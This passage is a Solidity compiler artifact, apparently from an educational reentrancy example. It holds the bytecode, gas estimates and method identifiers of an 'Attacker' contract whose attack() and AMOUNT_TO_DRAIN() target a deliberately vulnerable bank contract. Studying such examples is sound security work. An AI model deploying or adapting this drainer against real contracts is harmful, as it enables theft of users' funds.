0x36D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x17C PUSH2 0x1D2 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x189 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x192 PUSH2 0x2B6 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x19F SWAP2 SWAP1 PUSH2 0x2DA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE EQ PUSH2 0x21C JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x213 SWAP1 PUSH2 0x3E0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x287 SWAP2 SWAP1 PUSH2 0x2DA JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x29E JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2B0 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 DUP2 JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2D4 DUP2 PUSH2 0x2C2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2ED PUSH0 DUP4 ADD DUP5 PUSH2 0x2CB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x335 PUSH2 0x330 PUSH2 0x32B DUP5 PUSH2 0x2F3 JUMP JUMPDEST PUSH2 0x312 JUMP JUMPDEST PUSH2 0x2F3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x346 DUP3 PUSH2 0x31B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x357 DUP3 PUSH2 0x33C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x367 DUP2 PUSH2 0x34D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x380 PUSH0 DUP4 ADD DUP5 PUSH2 0x35E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x53656E64203120657468657220746F207374617274207468652061747461636B PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x3CA PUSH1 0x20 DUP4 PUSH2 0x386 JUMP JUMPDEST SWAP2 POP PUSH2 0x3D5 DUP3 PUSH2 0x396 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x3F7 DUP2 PUSH2 0x3BE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xF7 PUSH31 0xC201CAEA8067445C8C4502D2398F35AB8A43DEAB76F2724125BF0440C42764 PUSH20 0x6F6C634300081800330000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "215200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"AMOUNT_TO_DRAIN()": "369",
						"attack()": "infinite",
						"bank()": "infinite",
						"getBalance()": "312"
					}
				},
				"methodIdentifiers": {
					"AMOUNT_TO_DRAIN()": "f56d2068",
					"attack()": "9e5faafc",
					"bank()": "76cdb03b",
					"getBalance()": "12065fe0"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 71,
						"contract": "security/ReentrancyExample.sol:Attacker",
						"label": "bank",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(VulnerableBank)68"
					}
				],
				"types": {
					"t_contract(VulnerableBank)68": {
						"encoding": "inplace",
						"label": "contract VulnerableBank",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}